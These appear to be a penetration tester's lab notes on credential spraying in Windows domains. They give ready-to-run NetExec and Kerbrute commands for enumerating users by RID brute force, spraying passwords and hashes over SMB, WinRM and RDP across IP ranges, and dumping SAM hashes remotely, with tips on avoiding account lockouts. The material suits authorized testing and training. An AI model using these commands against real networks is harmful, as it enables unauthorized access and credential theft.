
Once credentials or many credentials are found we'll have to utilize them to spray all computers on the network, to check where we have an foothold.

- Create wordlist of all domain users.
- Create wordlist of all retrieved passwords/hashes.

##### nxc spraying domain users

```
nxc smb 192.168.230.244 -u 'ka' -p 'ka' --rid-brute > newusers.txt
```

Saved the nxc output into an users.txt file and ran the following command:

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

##### nxc spraying local users

Save the output in an "users.txt" file.

```
nxc smb 192.168.230.244 -u 'ka' -p 'ka' --rid-brute --local-auth
```

Formatted the output properly and stored it in an newusers.txt wordlist.

```
awk -F'\\' '{print $2}' users.txt > newusers.txt
```
##### Kerbrute passwordspraying

```
./kerbrute -d thm.local --dc 10.114.134.197 passwordspray ~/newusers.txt 'CHANGEME2023!'
```

## IMPORTANT

ACCOUNTS GET LOCKED OUT!

That's expected as your password list grows, your lockout risk increases exponentially. Always check the threshold first using 

```
nxc smb 172.16.x.10 -u leon -p 'password' --pass-pol
```

When you're ready to test confirmed pairs across other hosts, line up your usernames.txt and passwords.txt so the credentials match line-for-line, then run nxc with the --no-bruteforce flag. This ensures it only tries the specific pair for each user rather than cycling every password against every account
You can look at it like this: if you have 5 passwords and the lockout threshold is 5, and you didn't use the --no-bruteforce method, you will lock out all the users in your users.txt file.

After aligning the users.txt with the passwords.txt, we can run the following command:

```
nxc winrm 172.16.210.13 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```
##### With passwords

1. smb

```
nxc smb 172.16.125.10-14 172.16.125.82-83 192.168.125.120-122 -u users.txt -p passwords.txt --continue-on-success
```

2. winrm

```
nxc winrm 172.16.125.10-14 172.16.125.82-83 192.168.125.120-122 -u users.txt -p passwords.txt --continue-on-success
```

3. rdp

```
nxc rdp 172.16.125.10-14 172.16.125.82-83 192.168.125.120-122 -u users.txt -p passwords.txt --continue-on-success
```

##### Using nxc to enumerate users descriptions & if users are local or domain users

This will enumerate the description, which could hide an password.

```
nxc smb 192.168.230.244 -u 'ka' -p 'ka' --users
```
##### If Creds aren't domain, only local we have to use the following:

```
nxc smb 192.168.230.244 -u 'ka' -p 'ka' --local-auth
```
##### Dump hashes remotely

```
nxc smb 192.168.230.244 -u 'ka' -p 'ka' --sam
```
##### With hashes

```
nxc smb 172.16.125.10-172.16.125.14 172.16.125.82-83 -u users.txt -H hashes.txt
```

Spraying multiple protocols with nxcspray.

```
nxcspray 
```

1. Create wordlist of all ip's > targets.txt

```
nxcspray smb,winrm,rdp targets.txt -u wario -p 'Mushroom!'
```
